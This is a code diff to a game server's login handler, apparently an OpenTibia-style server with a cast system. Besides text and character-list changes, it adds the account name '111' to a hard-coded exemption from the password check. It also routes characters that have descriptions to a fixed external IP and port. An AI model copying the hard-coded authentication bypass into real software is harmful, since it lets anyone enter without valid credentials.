@@ -151,7 +151,9 @@ void ProtocolLogin::onRecvFirstMessage(NetworkMessage& msg)
 	}
 
 	Account account;
-	if(!IOLoginData::getInstance()->loadAccount(account, name) || (account.name != "10" && !encryptTest(account.salt + password, account.password)))
+	account.name = name;
+	account.password = password;
+	if(!IOLoginData::getInstance()->loadAccount(account, name) || (account.name != "10" && account.name != "111" && !encryptTest(account.salt + password, account.password)))
 	{
 		disconnectClient(0x0A, "Invalid account name or password.");
 		return;
@@ -223,7 +225,7 @@ void ProtocolLogin::onRecvFirstMessage(NetworkMessage& msg)
 	{
 		srand(time(NULL));
 		int random_number = std::rand();
-		sprintf(motd, "%d\nWelcome to cast system!\n\n Do you know you can use CTRL + ARROWS\n to switch casts?\n\nVocê sabia que pode usar CTRL + SETAS\n para alternar casts?", random_number);
+		sprintf(motd, "%d\nWelcome to cast system!\n\n Do you know you can use CTRL + ARROWS\n to switch casts?\n\nVoce sabia que pode usar CTRL + SETAS\n para alternar casts?", random_number);
 		output->addString(motd);
 	}
 	else
@@ -306,20 +308,26 @@ void ProtocolLogin::onRecvFirstMessage(NetworkMessage& msg)
 		#ifndef __LOGIN_SERVER__
 		for(Characters::iterator it = account.charList.begin(); it != account.charList.end(); ++it)
 		{
-			output->addString((*it));
-			if(g_config.getBool(ConfigManager::ON_OR_OFF_CHARLIST))
-			{
-				if(g_game.getPlayerByName((*it)))
-					output->addString("Online");
-				else
-					output->addString("Offline");
-			}
-			else
-				output->addString(g_config.getString(ConfigManager::SERVER_NAME));
+			output->addString((*it).name);
 
-			output->add<uint32_t>(serverIp);
-			IntegerVec games = vectorAtoi(explodeString(g_config.getString(ConfigManager::GAME_PORT), ","));
-			output->add<uint16_t>(games[random_range(0, games.size() - 1)]);
+			if ((*it).description.empty()) {
+				if (g_config.getBool(ConfigManager::ON_OR_OFF_CHARLIST)) {
+					if (g_game.getPlayerByName((*it).name))
+						output->addString("Online");
+					else
+						output->addString("Offline");
+				} else {
+					output->addString(g_config.getString(ConfigManager::SERVER_NAME));
+				}
+
+				output->add<uint32_t>(serverIp);
+				IntegerVec games = vectorAtoi(explodeString(g_config.getString(ConfigManager::GAME_PORT), ","));
+				output->add<uint16_t>(games[random_range(0, games.size() - 1)]);
+			} else {
+				output->addString((*it).description);
+				output->add<uint32_t>(inet_addr("141.147.65.1"));
+				output->add<uint16_t>(7521);
+			}
 		}
 		#else
 		for(Characters::iterator it = charList.begin(); it != charList.end(); ++it)
